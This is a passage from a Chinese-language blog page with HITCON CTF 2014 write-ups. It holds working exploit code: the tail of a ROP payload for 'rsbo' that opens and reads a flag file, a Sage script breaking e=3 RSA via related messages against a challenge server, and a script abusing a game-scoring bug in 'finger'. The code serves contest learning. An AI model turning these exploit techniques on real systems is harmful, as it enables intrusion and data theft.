class="number">0x0804a080</span>)</span><br><span class="line">    read_size = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x10</span>)</span><br><span class="line">    flag_path = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x080487d0</span>)</span><br><span class="line">    fd = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#send</span></span><br><span class="line">    payload1 = <span class="string">''</span></span><br><span class="line">    payload1 += junk</span><br><span class="line"></span><br><span class="line">    <span class="comment">#ebp</span></span><br><span class="line">    payload1 += bss</span><br><span class="line"></span><br><span class="line">    <span class="comment">#call read\_80\_byte</span></span><br><span class="line">    payload1 += read\_80\_byte</span><br><span class="line"></span><br><span class="line">    <span class="comment">#set esp=ebp=.bss</span></span><br><span class="line">    payload1 += leave_ret</span><br><span class="line"></span><br><span class="line">    <span class="comment">#read\_80\_byre arg1</span></span><br><span class="line">    payload1 += bss </span><br><span class="line"></span><br><span class="line">    <span class="comment">#junk</span></span><br><span class="line">    payload1 += struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x00</span>) *<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#write to .bss</span></span><br><span class="line">    payload2 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#ebp</span></span><br><span class="line">    payload2 += struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x00</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#open</span></span><br><span class="line">    payload2 += opep_pid </span><br><span class="line"></span><br><span class="line">    <span class="comment">#ppr</span></span><br><span class="line">    payload2 += ppr </span><br><span class="line"></span><br><span class="line">    <span class="comment">#open arg</span></span><br><span class="line">    payload2 += flag_path</span><br><span class="line">    payload2 += struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x00</span>) </span><br><span class="line"></span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    payload2 += read_pid</span><br><span class="line">    <span class="comment">#pppr</span></span><br><span class="line">    payload2 += pppr</span><br><span class="line">    <span class="comment">#read arg</span></span><br><span class="line">    payload2 += fd</span><br><span class="line">    payload2 += buf</span><br><span class="line">    payload2 += read_size</span><br><span class="line"></span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    payload2 += write_pid</span><br><span class="line">    <span class="comment">#****</span></span><br><span class="line">    payload2 += pppr</span><br><span class="line">    <span class="comment">#write arg</span></span><br><span class="line">    payload2 += struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x1</span>)</span><br><span class="line">    payload2 += buf</span><br><span class="line">    payload2 += read_size</span><br><span class="line"></span><br><span class="line">    payload = payload1 + payload2</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> \_\_name\_\_ == <span class="string">'\_\_main\_\_'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h1 id="0x02-rsaha"><a href="#0x02-rsaha" class="headerlink" title="0x02 rsaha"></a>0x02 rsaha</h1><p>这个是利用RSA的低指数攻击 paper<a href="https://www.cs.unc.edu/%7Ereiter/papers/1996/Eurocrypt.pdf" target="_blank" rel="noopener">https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf</a> 用到了sage <a href="http://www.sagemath.org/" target="_blank" rel="noopener">http://www.sagemath.org/</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_m</span><span class="params">(n,c1,c2)</span>:</span></span><br><span class="line">    e=<span class="number">3</span></span><br><span class="line">    x = PolynomialRing(ZZ.quo(n*ZZ), <span class="string">'x'</span>).gen()</span><br><span class="line">    f=x**e-c1</span><br><span class="line">    g=(x+<span class="number">1</span>)**e-c2</span><br><span class="line">    a = f</span><br><span class="line">    b = g</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = a % b</span><br><span class="line">        <span class="comment">#print i</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">            <span class="comment">#print 'FOUND %s' % rp</span></span><br><span class="line">            c = rp.coeffs()</span><br><span class="line">            <span class="keyword">return</span> int(-pow(c\[<span class="number">1</span>\], <span class="number">-1</span>, n) * c\[<span class="number">0</span>\])</span><br><span class="line">        rp = r</span><br><span class="line">        a, b = b, r</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)</span><br><span class="line">sock.connect((<span class="string">'54.64.40.172'</span>, <span class="number">5454</span>))</span><br><span class="line"></span><br><span class="line">recv = sock.recv(<span class="number">100000</span>)</span><br><span class="line"><span class="keyword">print</span> repr(recv)</span><br><span class="line">n = int(recv)</span><br><span class="line">recv = sock.recv(<span class="number">100000</span>)</span><br><span class="line">c = recv.split(<span class="string">'n'</span>)</span><br><span class="line">c1 = int(c\[<span class="number">1</span>\])</span><br><span class="line">c2 = int(c\[<span class="number">2</span>\])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'n:%d'</span> % n</span><br><span class="line"><span class="keyword">print</span> <span class="string">'c1:%d'</span> % c1</span><br><span class="line"><span class="keyword">print</span> <span class="string">'c2:%d'</span> % c2</span><br><span class="line"></span><br><span class="line">m = get_m(n,c1,c2)</span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line">sock.send(<span class="string">"%dn"</span> % m)</span><br><span class="line"></span><br><span class="line">recv = sock.recv(<span class="number">100000</span>)</span><br><span class="line"><span class="keyword">print</span> repr(recv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    recv = sock.recv(<span class="number">100000</span>)</span><br><span class="line">    <span class="keyword">print</span> repr(recv)</span><br><span class="line">    c = recv.split(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">print</span> c</span><br><span class="line">    n = int(c\[<span class="number">1</span>\])</span><br><span class="line">    c1 = int(c\[<span class="number">2</span>\])</span><br><span class="line">    c2 = int(c\[<span class="number">3</span>\])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'n:%d'</span> % n</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'c1:%d'</span> % c1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'c2:%d'</span> % c2</span><br><span class="line"></span><br><span class="line">    m = get_m(n,c1,c2)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'m:%d'</span> % m</span><br><span class="line">    sock.send(<span class="string">"%dn"</span> % m)</span><br><span class="line"></span><br><span class="line">    recv = sock.recv(<span class="number">100000</span>)</span><br><span class="line">    <span class="keyword">print</span> repr(recv)</span><br></pre></td></tr></table></figure>
<h1 id="0x03-finger"><a href="#0x03-finger" class="headerlink" title="0x03 finger"></a>0x03 finger</h1><p>是ginger的简单版，因为出题人留bug了所以变简单了。。 分析程序，一开始出3个字符串，自己选一个，BOSS选一个。 三个字符串是循环取胜的关系，相当于要跟boss比猜拳。 你先选一个，然后发送这个字符串开头的16位字符串的md5给它，然后boss告诉你它选了什么，之后你再发你选了什么。比胜负。 那个验证的部分我说的简单了，ginger就是要绕过这个验证部分。 finger的话有个bug。如果你作弊了，就是前后不一的话扣1血。你赢了boss它扣1-3血，所以总是可以赢的。 下面是代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7  </span></span><br><span class="line">\<span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Created on 2014年8月17日</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: yf</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(hand)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(md5.md5(hand).hexdigest(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> \_\_name\_\_ == <span class="string">'\_\_main\_\_'</span>:</span><br><span class="line">    sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)</span><br><span class="line">    sock.connect((<span class="string">'210.71.253.236'</span>,<span class="number">7171</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#round num</span></span><br><span class="line">    recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    recv = recv.split(<span class="string">'n'</span>)</span><br><span class="line">    hands=\[\]</span><br><span class="line">    <span class="keyword">print</span> recv\[<span class="number">3</span>\]\[<span class="number">9</span>:\]</span><br><span class="line">    hands = eval (recv\[<span class="number">3</span>\]\[<span class="number">9</span>:\])</span><br><span class="line">    secret = hands\[<span class="number">2</span>\]+<span class="string">'11111111111'</span></span><br><span class="line">    sock.send(<span class="string">"1n"</span>)</span><br><span class="line">    recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> recv</span><br><span class="line">    sock.send(<span class="string">"%dn"</span> % get_md5(secret))</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> recv</span><br><span class="line">    his_hand = recv\[recv.find(<span class="string">'e:'</span>)+<span class="number">3</span>:recv.find(<span class="string">'e:'</span>)+<span class="number">8</span>\]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'HIS:'</span>+his_hand</span><br><span class="line">    <span class="keyword">if</span> his_hand==hands\[<span class="number">0</span>\]:</span><br><span class="line">        sock.send(<span class="string">'111n'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sock.send(secret+<span class="string">'n'</span>)</span><br><span class="line">    recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> recv</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#new round</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> recv</span><br><span class="line">        recv = recv.split(<span class="string">'n'</span>)</span><br><span class="line">        <span class="keyword">print</span> recv</span><br><span class="line"></span><br><span class="line">        hands = eval (recv\[<span class="number">4</span>\]\[<span class="number">9</span>:\])</span><br><span class="line">        secret = hands\[<span class="number">2</span>\]+<span class="string">'11111111111'</span></span><br><span class="line">        sock.send(<span class="string">"1n"</span>)</span><br><span class="line">        recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> recv</span><br><span class="line">        sock.send(<span class="string">"%dn"</span> % get_md5(secret))</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> recv</span><br><span class="line">        his_hand = recv\[recv.find(<span class="string">'e:'</span>)+<span class="number">3</span>:recv.find(<span class="string">'e:'</span>)+<span class="number">8</span>\]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'HIS:'</span>+his_hand</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> his_hand==hands\[<span class="number">0</span>\]:</span><br><span class="line">            sock.send(<span class="string">'111n'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sock.send(secret+<span class="string">'n'</span>)</span><br><span class="line">        recv = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> recv</span><br></pre></td></tr></table></figure>
                    
                        


                    
                    
                        <p>
                            <a
                                href="/writeups/hitcon-ctf-2014-rsbo-finger-rsaha-writeup/#post-footer"
                                class="postShorten-excerpt_link link"
                                aria-label=""
                            >
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    <div class="pagination-bar">
    <ul class="pagination">
        
        
          <li class="pagination-next">
            <a
                class="btn btn--default btn--small"
                href="/page/2/"
                aria-label="OLDER POSTS"
            >
              <span>OLDER POSTS</span>
              <i class="fa fa-angle-right text-base icon-ml"></i>
            </a>
          </li>
        
        <li class="pagination-number">page 1 of 3</li>
    </ul>
</div>

</section>


                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2025 Eadom. All Rights Reserved.
    </span>
</footer>

            </div>
            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-times"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
        
            <h4 id="about-card-name">Eadom</h4>
        
            <div id="about-card-bio"><p>NO PWN NO FUN</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>@Alibaba</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker-alt"></i>
                <br/>
                Hangzhou
            </div>
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.png');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-rmcrjyesoiaq5zeyncix4j3bagwy19cwj9vg041guvn2zdknk0vkkwd3bneh.min.js"></script>
<!--SCRIPTS END-->





    </body>
</html>
